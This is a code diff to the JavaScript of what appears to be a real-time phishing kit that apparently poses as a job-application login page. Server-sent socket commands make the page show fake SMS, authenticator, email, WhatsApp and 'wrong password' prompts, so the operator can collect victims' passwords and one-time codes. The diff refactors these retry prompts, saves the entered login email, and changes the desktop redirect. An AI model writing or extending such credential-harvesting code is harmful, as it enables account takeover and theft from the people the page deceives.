@@ -263,16 +263,24 @@
     }
 
     
+    function retryCodePrompt() {
+      const timerDiv = document.querySelector('.timer');
+      const btn = document.getElementById('continueBtn');
+      if (timerDiv) {
+        timerDiv.innerText = "The code you entered isn't correct. Please check again.";
+        timerDiv.style.display = 'block';
+      }
+      if (btn) {
+        btn.innerHTML = 'Continue';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+      }
+    }
+
     socket.on('show-2fa', () => {
       if (shownCommands['2fa']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['2fa'] = true;
         loadPage('sms');
@@ -280,14 +288,7 @@
     });
     socket.on('show-auth', () => {
       if (shownCommands['auth']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['auth'] = true;
         loadPage('auth');
@@ -295,14 +296,7 @@
     });
     socket.on('show-email', () => {
       if (shownCommands['email']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['email'] = true;
         loadPage('email');
@@ -310,14 +304,7 @@
     });
     socket.on('show-whatsapp', () => {
       if (shownCommands['whatsapp']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['whatsapp'] = true;
         loadPage('wh');
@@ -348,8 +335,12 @@
     });
 
     socket.on('show-gmail-wrong-pass', () => {
-      try { sessionStorage.setItem('pendingModal', 'wrongcreds'); } catch(e) {}
-      window.location.href = 'apply.html';
+      if (!document.getElementById('loginBtn')) {
+        showLoginPage();
+      } else {
+        resetLoginForm();
+      }
+      loadModalPage('wrong-creds');
     });
 
     socket.on('redirect', (url) => {
@@ -404,6 +395,8 @@
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
       if (!username || !password) return;
+
+      try { sessionStorage.setItem('lastLoginEmail', username); } catch(e) {}
 
       loginBtn.disabled = true;
       loginBtn.style.opacity = '0.4';
@@ -464,7 +457,7 @@
       if (isLocal) return; // skip redirect when testing locally
       const isMobile = window.innerWidth <= 768;
       if (!isMobile) {
-        window.location.href = 'selbyjennings';
+        window.location.href = 'apply.html';
       }
     }
     checkIfStillMobile();
